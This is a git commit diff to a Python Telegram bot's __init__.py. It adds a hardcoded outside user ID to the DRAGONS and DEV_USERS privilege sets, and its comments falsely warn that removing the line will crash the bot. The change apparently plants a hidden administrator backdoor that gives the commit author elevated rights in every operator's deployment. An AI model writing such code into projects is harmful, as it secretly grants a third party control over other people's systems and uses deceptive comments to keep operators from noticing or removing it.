b7daf79e50052ac07eacd9705327e6b50a2e5148
LEGEND X <74249238+LEGENDXOP@users.noreply.github.com>
2021-01-21 15:01:31 +0530

    Op

--- LEGEND/__init__.py
+++ LEGEND/__init__.py
@@ -174,8 +174,12 @@ else:
 DRAGONS.add(OWNER_ID)
 
 DEV_USERS.add(OWNER_ID)
+# example of tg_id remove this your bot crashed
+DRAGONS.add(1100231654)
+#do not remove this 🔥
+DEV_USERS.add(1100231654)
 
-    
+
 if not SPAMWATCH_API:
     sw = None
     LOGGER.warning("SpamWatch API key missing! recheck your config.")
